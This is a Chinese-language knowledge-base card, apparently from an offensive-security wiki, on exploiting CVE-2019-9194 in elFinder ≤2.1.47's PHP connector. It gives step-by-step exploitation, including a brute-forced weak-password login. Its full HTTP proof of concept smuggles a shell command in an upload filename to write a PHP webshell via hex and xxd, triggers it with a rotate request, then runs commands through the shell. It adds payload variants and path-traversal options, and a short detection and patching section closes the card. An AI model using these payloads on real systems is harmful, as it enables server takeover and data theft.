---
id: web-php-rce-elfinder-imgrotate-filename-command-injection
title: elFinder ≤2.1.47 PHP connector：上传文件夹带 shell 元字符，rotate 触发 imgRotate 里 $path 未加引号造成命令注入（CVE-2019-9194）
type: scenario
domain: web
path: web/php/rce
technique: elfinder-imgrotate-filename-command-injection
tags:
- php
- elfinder
- file-manager
- command-injection
- rce
- cve-2019-9194
- webshell
cve:
- CVE-2019-9194
severity: high
confidence: high
affected_versions: elFinder ≤ 2.1.47（原文靶场组件版本 2.1.47）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:53:46+08:00'
  notes: 已对照原文核对：elFinder 2.1.47 版本、ExploitDB CVE-2019-9194 payload（test.jpg 加分号接 echo 十六进制再接 xxd 还原写 hack.php）、upload 后 cmd=resize 且 mode=rotate 两步触发、imgRotate 拼的是未转义的 path 而非已准备好的 quotedPath、最后访问 php/hack.php?c= 执行，均与正文一致；已把 PoC 第二步 target 由 l1_Lw 修正为 upload 响应 added[0].hash（l1_Lw 只是上传目标目录）；本次核对未读取图片，上传被 WAF 拦截、目录扫描与落地回显截图未核实；未执行 PoC。
url: /docs/web/php/rce/web-php-rce-elfinder-imgrotate-filename-command-injection/
draft: false
kb_aliases:
- elFinder 命令注入
- CVE-2019-9194
- elFinder 2.1.47 getshell
- imgRotate 命令执行
- test.jpg; 文件名注入
---

## 一句话结论

elFinder 的 PHP connector 在 `imgRotate()` 里用 `procExec` 拼命令时，把未经 `escapeshellarg` 的 `$path`（而不是已准备好的 `$quotedPath`）拼进去，因此只要上传时把文件名写成 `test.jpg;<命令>;echo test.jpg` 这种形态，再发一次 `cmd=resize&mode=rotate` 请求，文件名里的分号就会在服务端被 shell 解释，直接在 PHP 进程权限下执行任意命令并落地 WebShell。

## 原理

- **入口**：elFinder 的 PHP connector（`php/connector.minimal.php`）用 `cmd` 参数分发操作，`upload` 落文件、`resize` 处理图片、`file` 下载回显。这些操作都走 `elFinderVolumeDriver`。
- **缺陷点**：`imgRotate()` 里先把路径处理成安全的 `$quotedPath`，但真正拼进 `procExec` 命令行时用的仍是原始 `$path`。图片文件名由用户上传时决定，因此文件名中的 `;`、`` ` ``、`$()` 会被 `/bin/sh -c` 当作命令分隔符执行。
- **为什么需要两步**：上传阶段只负责把恶意文件名落到磁盘（elFinder 允许文件名包含 `;`），此时还没有命令执行；只有在后续 `rotate`（或其它走 `procExec` 的图片操作）时才会把该路径拼进命令行，所以利用链是「先上传 → 再触发 rotate」。
- **写入 WebShell 的手法**：命令注入点不需要回显，直接把十六进制内容用 `xxd -r -p` 还原成 PHP 文件写进 connector 同级目录（如 `php/hack.php`），随后访问该文件即得到命令执行页面。这样即使用户对上传文件有 WAF 拦截（原文上传 `.php`/改名 `.php` 被 WAF 拦下），也能绕过。
- **触发条件**：connector 可访问且不要求认证（或已获得低权限会话）；elFinder 版本 ≤ 2.1.47；`php` 目录对 Web 进程可写。

## 触发条件

- 目标使用 elFinder ≤ 2.1.47 的 PHP connector，且 `/php/connector.minimal.php` 对外可达。
- 上传目录可写，且该目录（或其上级）在 Web 根内、PHP 可解析。
- 服务端 `proc_open`/`exec` 未被禁用（elfinder 的图片操作依赖它们）。
- 已通过弱口令、目录泄露或其它入口拿到 elFinder 会话，或 connector 本身缺少鉴权。

## 利用步骤

1. 判定组件与版本：访问文件管理器页面，确认前端为 elFinder，版本显示 2.1.47；也可从 `/php/connector.minimal.php` 的响应格式判断。
2. 登录（原文用爆破得到的普通账号 `jose`，口令为常见弱口令），跳转到 `files.lookup.thm` 这类文件管理域名。
3. 先确认 `php/` 目录可访问：目录扫描发现 `/php/` 下可直接读取/执行源码文件，说明该目录在 Web 根内且 PHP 可解析。
4. 构造恶意文件名上传：文件名设为 `test.jpg;echo <PHP源码的十六进制> | xxd -r -p > hack.php;echo test.jpg`，以 multipart 提交到 connector 的 `cmd=upload&target=l1_Lw`。
5. 触发 rotate：请求 `connector.minimal.php?target=<上传返回的 hash>&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize`，此时文件名被拼进命令行执行。
6. 访问 `/<connector 所在目录>/hack.php?c=<命令>`，确认命令回显，得到 WebShell。
7. 提权前先确认当前身份（原文为 `www-data`），再按本机 SUID/sudo 情况继续。

## PoC

```text
# 1) 上传：文件名即 payload，内容是一张合法 jpg
POST /php/connector.minimal.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="upload[]"; filename="test.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > hack.php;echo test.jpg"
Content-Type: image/jpeg

<jpg 字节>
------x
Content-Disposition: form-data; name="reqid"

1693222c439f4
------x
Content-Disposition: form-data; name="cmd"

upload
------x
Content-Disposition: form-data; name="target"

l1_Lw
------x--
```

```http
# 2) 触发 imgRotate（target 用上一步 upload 响应里 added[0].hash，不是 l1_Lw）
GET /php/connector.minimal.php?target=<added[0].hash>&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c HTTP/1.1
Host: files.target
```

```text
# 3) 访问落地文件
GET /php/hack.php?c=id HTTP/1.1
# 响应为命令输出（www-data）

# 十六进制片段含义：<?php system($_GET["c"]); ?>
```

## 变体与关联

- 命令注入点不止 `rotate`：其它把用户可控路径拼进 `procExec` 的图片操作（`resize` 的其它 mode、`watermark`、`archive`/`extract` 的 shell 调用）在同类版本中也可触发；关键是「文件名进入 shell 命令行」。
- 文件名 payload 可用反引号、`$()` 或 `|` 替代分号；若分号被上游代理过滤，可换 `%0a` 或空格+反引号。
- 若上传目录不可解析 PHP，可把落地路径改为 `../` 穿越到 Web 根，或用命令注入直接写 `.htaccess`/`.user.ini`。
- 关联：其它「文件管理器/上传组件自带命令执行」卡（elFinder fileconnect 的 upload/mkfile/put 写马是滥用其正常写文件能力，本卡是文件名进 shell 的参数注入，两条链入口同组件但根因不同）。上传被 WAF 拦时用命令注入绕过，与「上传后改名/双扩展」类卡互补。

## 检测与防御

- 升级 elFinder 到 2.1.48 及以上；该版本修复了 `imgRotate` 使用未转义路径的问题。
- 审计所有 `procExec`/`proc_open`/`exec` 调用点，把路径参数统一走 `escapeshellarg()`；不要依赖「已经算过 `$quotedPath`」就默认拼进去的是安全值。
- 文件名白名单：拒绝 `;`、`` ` ``、`$`、`|`、`&`、换行等元字符；上传目录禁止脚本执行并移出 Web 根。
- 日志检测：`connector.minimal.php` 请求中出现 `cmd=resize`/`mode=rotate` 且 `target` 对应的文件名含 shell 元字符；文件管理器目录下新增 `.php` 文件；`/php/` 目录出现异常访问与命令回显。
